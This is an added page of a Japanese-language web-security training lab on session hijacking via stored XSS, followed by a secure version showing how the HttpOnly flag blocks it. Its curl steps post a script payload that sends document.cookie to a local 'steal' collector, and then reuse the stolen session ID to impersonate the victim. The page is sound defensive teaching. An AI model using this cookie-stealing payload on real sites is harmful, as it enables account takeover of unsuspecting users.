@@ -1,0 +1,103 @@
+---
+title: Session Hijacking — XSSで盗んだセッションIDで他人になりすます - 実際に試す
+sidebar_label: ラボ
+sidebar_position: 2
+---
+
+import { SessionHijackingLab } from '@site/src/components/labs/step04/SessionHijackingLab';
+
+# Session Hijacking — XSSで盗んだセッションIDで他人になりすます - 実際に試す
+
+## ラボ体験
+
+以下の埋め込みラボUIで、脆弱バージョンと安全バージョンを切り替えて試すことができます。
+
+<SessionHijackingLab />
+
+---
+
+## ハンズオン手順
+
+### Step 1: 脆弱バージョンで攻撃を体験
+
+**ゴール**: XSS を利用してセッション Cookie を窃取し、他のユーザーになりすましてアクセスできることを確認する
+
+1. 開発サーバーを起動する
+
+   ```bash
+   cd backend && pnpm dev
+   ```
+
+2. テストユーザー（alice）でログインし、セッション Cookie を確認する
+
+   - ブラウザの DevTools → Application → Cookies を開く
+   - `session_id` Cookie に `HttpOnly` 属性がない（チェックが空欄）ことを確認
+
+3. XSS ペイロードを投稿する（Stored XSS を利用）
+
+   ```bash
+   # Cookie 窃取スクリプトを含むコメントを投稿
+   curl -X POST http://localhost:3000/api/labs/session-hijacking/vulnerable/comment \
+     -H "Content-Type: application/json" \
+     -b "session_id=alice-session" \
+     -d '{"content": "<script>fetch(\"http://localhost:3001/steal?c=\"+document.cookie)</script>"}'
+   ```
+
+4. 別のユーザー（被害者）としてコメント一覧を閲覧する
+
+   - DevTools の Network タブで `http://localhost:3001/steal?c=session_id%3D...` へのリクエストを確認する
+   - セッション ID が外部に送信されていることを確認
+
+5. 窃取したセッション ID で被害者になりすます
+
+   ```bash
+   # 盗んだセッションIDでプロフィールにアクセス
+   curl http://localhost:3000/api/labs/session-hijacking/vulnerable/profile \
+     -b "session_id=<窃取したセッションID>"
+   ```
+
+6. 結果を確認する
+
+   - 被害者のプロフィール情報が返される
+   - **この結果が意味すること**: セッション ID は事実上のパスワードであり、`HttpOnly` なしの Cookie は XSS でいつでも盗める
+
+### Step 2: 安全バージョンで防御を確認
+
+**ゴール**: `HttpOnly` 属性により、同じ XSS 攻撃でも Cookie が窃取できないことを確認する
+
+1. 安全なエンドポイントでログインし、Cookie を確認する
+
+   - DevTools → Application → Cookies で `session_id` Cookie に `HttpOnly` のチェックが付いていることを確認
+
+2. 同じ XSS ペイロードを安全なエンドポイントで試す
+
+   ```bash
+   curl -X POST http://localhost:3000/api/labs/session-hijacking/secure/comment \
+     -H "Content-Type: application/json" \
+     -b "session_id=alice-session" \
+     -d '{"content": "<script>fetch(\"http://localhost:3001/steal?c=\"+document.cookie)</script>"}'
+   ```
+
+3. 結果を確認する
+
+   - XSS スクリプトが実行されても、`document.cookie` にセッション ID が含まれない
+   - 攻撃者のサーバーに送信される Cookie 値が空または `HttpOnly` Cookie を含まない
+   - DevTools Console で `document.cookie` を実行すると、`session_id` が表示されないことを確認
+
+4. コードの差分を確認する
+
+   - `backend/src/labs/step04-session/session-hijacking.ts` の脆弱版と安全版を比較
+   - **どの行が違いを生んでいるか** に注目: `setCookie` の `httpOnly: true` オプション
+
+### 確認ポイント
+
+以下を自分の言葉で説明できれば、このラボは完了です:
+
+- [ ] セッションハイジャックが成立するための条件は何か（XSS + HttpOnly なしの2つ）
+- [ ] `document.cookie` で読み取れる Cookie と読み取れない Cookie の違いは何か
+- [ ] `HttpOnly` 属性は「なぜ」セッション ID の窃取を防げるのか（ブラウザ内部でどう処理されるか）
+- [ ] `HttpOnly` だけでは不十分な理由と、XSS そのものを防ぐことが最重要である理由
+
+---
+
+[← ラボに戻る](./session-hijacking.mdx)
